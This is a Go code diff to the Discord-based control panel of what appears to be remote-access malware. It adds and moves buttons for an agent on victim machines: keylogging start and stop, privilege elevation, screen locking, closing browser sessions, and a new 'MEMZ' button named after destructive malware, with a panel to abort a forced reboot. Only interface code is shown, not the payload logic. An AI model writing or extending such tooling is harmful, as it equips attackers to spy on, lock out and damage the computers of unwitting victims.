@@ -90,14 +90,15 @@ func ControlPanel() []discordgo.MessageComponent {
 			Button("🔌 Shutdown Agent", discordgo.SecondaryButton, "btn_shutdown"),
 			Button("📡 Reconectar", discordgo.SecondaryButton, "btn_reconnect"),
 			Button("🛡️ Elevate", discordgo.SecondaryButton, "btn_elevate"),
+			Button("🔒 Lock Screen", discordgo.DangerButton, "btn_lock_on"),
+			Button("🔓 Unlock", discordgo.SuccessButton, "btn_lock_off"),
 		}},
 		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
 			Button("▶️ Start Keylog", discordgo.SuccessButton, "btn_keylog_start"),
 			Button("⏹ Stop Keylog", discordgo.SecondaryButton, "btn_keylog_stop"),
 		}},
 		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
-			Button("🔒 Lock Screen", discordgo.DangerButton, "btn_lock_on"),
-			Button("🔓 Unlock", discordgo.SuccessButton, "btn_lock_off"),
+			Button("☠️ MEMZ", discordgo.DangerButton, "btn_memz"),
 		}},
 	}
 }
@@ -145,6 +146,14 @@ func GooglePanel(selected int, options []discordgo.SelectMenuOption) []discordgo
 			Button("🔄 Actualizar", discordgo.SecondaryButton, "btn_google_refresh"),
 			closeOne,
 			Button("💥 Cerrar todas", discordgo.DangerButton, "btn_google_all"),
+		}},
+	}
+}
+
+func MemzResultPanel() []discordgo.MessageComponent {
+	return []discordgo.MessageComponent{
+		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
+			Button("🛑 Abortar reinicio", discordgo.SecondaryButton, "btn_memz_abort"),
 		}},
 	}
 }
